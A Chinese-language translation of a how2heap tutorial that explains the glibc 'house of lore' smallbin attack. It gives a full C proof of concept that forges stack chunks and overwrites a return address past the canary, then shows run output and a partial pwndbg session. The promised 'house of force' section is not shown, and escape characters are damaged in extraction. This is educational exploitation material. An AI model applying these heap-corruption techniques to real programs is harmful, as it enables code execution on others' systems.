# how2heap之house of lore && house of force
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> 本文包含 house of lore,house of force
PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂
## house of lore
###  序
我们的house of lore其实就是利用了small bin的机制而导致的任意地址分配,所利用的地方就是
    [ ... ]
    else
        {
          bck = victim->bk;
        if (__glibc_unlikely (bck->fd != victim)){
                      errstr = "malloc(): smallbin double linked list corrupted";
                      goto errout;
                    }
           set_inuse_bit_at_offset (victim, nb);
           bin->bk = bck;
           bck->fd = bin;
           [ ... ]
我们需要做的,就是将small bin的bk指针指向我们的fake
chunk,也就是控制bck,但是要注意的是bck->fd!=victim这个地方需要绕过
关于small bin在最2.29中其实还有一种攻击方法,但是这里就不再详述了
这里要注意一下的就是程序推荐在ubuntu 14.04 32位机上测试,但我是在ubuntu 16.04的64位机上测试的,所以会有一些出入,但其实问题不大
###  源代码
这里我就不删了,只加了一点注释
    /*
    Advanced exploitation of the House of Lore - Malloc Maleficarum.
    This PoC take care also of the glibc hardening of smallbin corruption.
    [ ... ]
    else
        {
          bck = victim->bk;
        if (__glibc_unlikely (bck->fd != victim)){
                      errstr = "malloc(): smallbin double linked list corrupted";
                      goto errout;
                    }
           set_inuse_bit_at_offset (victim, nb);
           bin->bk = bck;
           bck->fd = bin;
           [ ... ]
    */
    #include 
    #include 
    #include 
    #include 
    void jackpot(){ puts("Nice jump d00d"); exit(0); }
    int main(int argc, char * argv[]){
      intptr_t* stack_buffer_1[4] = {0};
      intptr_t* stack_buffer_2[3] = {0};
      fprintf(stderr, "nWelcome to the House of Loren");
      //这个版本也可以绕过glibc malloc引入的强化检查
      fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc mallocn");                                                                                                        fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23nn");
      //分配victim chunk(100)
      fprintf(stderr, "Allocating the victim chunkn");
      intptr_t *victim = malloc(100);
      //这时堆上的第一个small chunk
      fprintf(stderr, "Allocated the first small chunk on the heap at %pn", victim);
      //我们需要去掉头部大小才能得到真正的victim地址
      // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk                                                                                                         intptr_t *victim_chunk = victim-2;
      fprintf(stderr, "stack_buffer_1 at %pn", (void*)stack_buffer_1);
      fprintf(stderr, "stack_buffer_2 at %pn", (void*)stack_buffer_2);
      //在栈上创建一个fake chunk
      fprintf(stderr, "Create a fake chunk on the stackn");
      //我们把fwd指针指向victim_chunk来绕过第二个malloc到最后一个malloc上small bin corrupted的检查,这样就可以将我们的栈地址写到small bin list里了
      fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
             "in second to the last malloc, which putting stack address on smallbin listn");
      stack_buffer_1[0] = 0;
      stack_buffer_1[1] = 0;
      stack_buffer_1[2] = victim_chunk;
      //将我们的bk指针指向stack_buffer_2并且将stack_buffer_2的fwd指针指向stack_buffer_1来绕过最后一个malloc上small bin corrupted的检查,这样就可以在栈上返回一个假的chunk
      fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buff                                                                                                 er_1 "
             "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "                                                                                                               "chunk on stack");
      stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
      stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
      //分配另一个large bin来避免small bin在free的时候与top chunk合并
      fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
             "the small one during the free()n");
      void *p5 = malloc(1000);
      fprintf(stderr, "Allocated the large chunk on the heap at %pn", p5);
      //free顶块,此时会将它放进unsorted bin中
      fprintf(stderr, "Freeing ttop he chunk %p, it will be inserted in the unsorted binn", victim);
      free((void*)victim);
      //在unsorted bin中,victim的fwd和bk指针都是0
      fprintf(stderr, "nIn the unsorted bin the victim's fwd and bk pointers are niln");
      fprintf(stderr, "victim->fwd: %pn", (void *)victim[0]);
      fprintf(stderr, "victim->bk: %pnn", (void *)victim[1]);
      //现在调用一个不会被unsorted bin或者small bin处理的malloc
      fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small binn");
      //这也意味着chunk victim会被插入到smallbin的最前面
      fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBinn", victim);
      void *p2 = malloc(1200);
      fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %pn", p2                                                                                                 );
      //victim chunk已经被排序并且他的fwd和bk指针也被更新了
      fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updatedn");
      fprintf(stderr, "victim->fwd: %pn", (void *)victim[0]);
      fprintf(stderr, "victim->bk: %pnn", (void *)victim[1]);
      //------------VULNERABILITY-----------      //现在假设我们有一个漏洞可以覆盖victim->bk指针
      fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointern");
      //victim->bk正指向栈上
      victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack 
      //------------------------------------      //现在我们分配一个和我们第一次free大小一样的chunk
      fprintf(stderr, "Now allocating a chunk with size equal to the first one freedn");
      //这个操作将会给我们返回已经被覆写的victim chunk并且将bin->bk指向被注入的victim->bk指针
      fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointern");
      void *p3 = malloc(100);
      //这个最后一次的malloc将欺骗glibc malloc返回一个在bin->bk中被注入的chunk
      fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bkn");
      char *p4 = malloc(100);
      fprintf(stderr, "p4 = malloc(100)n");
      //而stack_buffer_2的fwd指针也在最后一次的malloc中被修改了
      fprintf(stderr, "nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %pn",
             stack_buffer_2[2]);
      fprintf(stderr, "np4 is %p and should be on the stack!n", p4); // this chunk will be allocated on stack
      intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
      memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
    }
###  运行结果
    Welcome to the House of Lore
    This is a revisited version that bypass also the hardening check introduced by glibc malloc
    This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23
    Allocating the victim chunk
    Allocated the first small chunk on the heap at 0x81c010
    stack_buffer_1 at 0x7ffeea058c50
    stack_buffer_2 at 0x7ffeea058c30
    Create a fake chunk on the stack
    Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
    Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
    Allocated the large chunk on the heap at 0x81c080
    Freeing the chunk 0x81c010, it will be inserted in the unsorted bin
    In the unsorted bin the victim's fwd and bk pointers are nil
    victim->fwd: (nil)
    victim->bk: (nil)
    Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
    This means that the chunk 0x81c010 will be inserted in front of the SmallBin
    The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x81c470
    The victim chunk has been sorted and its fwd and bk pointers updated
    victim->fwd: 0x7f5b68740bd8
    victim->bk: 0x7f5b68740bd8
    Now emulating a vulnerability that can overwrite the victim->bk pointer
    Now allocating a chunk with size equal to the first one freed
    This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
    This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
    p4 = malloc(100)
    The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7f5b68740bd8
    p4 is 0x7ffeea058c60 and should be on the stack!
    Nice jump d00d
###  关键代码调试
断点如下:
       42   intptr_t *victim = malloc(100);
     ► 43   fprintf(stderr, "Allocated the first small chunk on the heap at %pn", victim);
       54   stack_buffer_1[0] = 0;
       55   stack_buffer_1[1] = 0;
       56   stack_buffer_1[2] = victim_chunk;
       57
     ► 58   fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
       61   stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
       62   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
       63
     ► 64   fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
       66   void *p5 = malloc(1000);
     ► 67   fprintf(stderr, "Allocated the large chunk on the heap at %pn", p5);
       71   free((void*)victim);
       72
     ► 73   fprintf(stderr, "nIn the unsorted bin the victim's fwd and bk pointers are niln");
       80   void *p2 = malloc(1200);
     ► 81   fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %pn", p2);
        91   victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
        92
        93   //------------------------------------        94
     ►  95   fprintf(stderr, "Now allocating a chunk with size equal to the first one freedn");
        98   void *p3 = malloc(100);
        99
       100
     ► 101   fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bkn");
        102   char *p4 = malloc(100);
     ► 103   fprintf(stderr, "p4 = malloc(100)n");
       109   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
       110   memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
     ► 111 }
下面直接运行,首先是malloc 了victim
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 113,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603070 PREV_INUSE {
      prev_size = 0,
      size = 135057,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> p stack_buffer_1
    $1 = {0x0, 0x0, 0x0, 0x0}
    pwndbg> p stack_buffer_2
    $2 = {0x0, 0x0, 0x0}
    pwndbg> p &stack_buffer_1
    $3 = (intptr_t *(*)[4]) 0x7fffffffe620
    pwndbg> p &stack_buffer_2
    $4 = (intptr_t *(*)[3]) 0x7fffffffe600
然后程序修改了stack_buffer_1的值
    pwndbg> p stack_buffer_1
    $5 = {0x0, 0x0, 0x603000, 0x0}
    //我们所伪造的stack_buffer_1
    $6 = {
      prev_size = 0,
      size = 0,
      fd = 0x603000,
      bk = 0x0,